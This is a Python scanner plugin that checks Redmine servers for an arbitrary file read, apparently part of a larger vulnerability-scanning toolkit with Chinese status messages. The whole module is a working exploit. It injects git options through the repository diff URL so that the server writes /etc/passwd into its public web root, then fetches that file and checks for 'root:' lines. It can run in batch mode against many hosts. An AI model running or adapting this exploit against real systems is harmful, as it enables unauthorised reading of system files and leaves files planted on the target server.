#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
from libs.output import OutPutFile
urllib3.disable_warnings()


class Redmine_File_Read_Scan:

    def run(self, urls):
        url = urls + '/projects/myrepo/repository/6/diff?rev=--no-renames&rev_to=--output'
        url2 = urls + '/projects/myrepo/repository/6/diff?rev=/etc/passwd&rev_to=--output=public/vluscs.txt'
        url3 = urls + '/vluscs.txt'
        # print(head)
        try:
            response = requests.get(url, headers=self.headers,verify=self.ssl, timeout=5, proxies=self.proxy)
            response2 = requests.get(url2, headers=self.headers,verify=self.ssl, timeout=5, proxies=self.proxy)
            response3 = requests.get(url3, headers=self.headers,verify=self.ssl, timeout=5, proxies=self.proxy)
            if "root:" in response3.text and "Rails.root:" not in response3.text:
                OutPrintInfo("Redmine", f'存在Redmine任意文件读取漏洞:{url3}')
                if self.batch:
                    OutPutFile("redmine_file_read.txt",f'存在Redmine任意文件读取漏洞:{url3}')
            else:
                if not self.batch:
                    OutPrintInfo("Redmine", '不存在Redmine任意文件读取漏洞')

        except Exception:
            if not self.batch:
                OutPrintInfo("Redmine", '目标请求出错')

    def main(self, target):
        self.batch = target["batch_work"]

        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("Redmine", '开始执行Redmine任意文件读取漏洞检测')
        self.run(url)
        if not self.batch:
            OutPrintInfo("Redmine", 'Redmine任意文件读取漏洞检测执行结束')


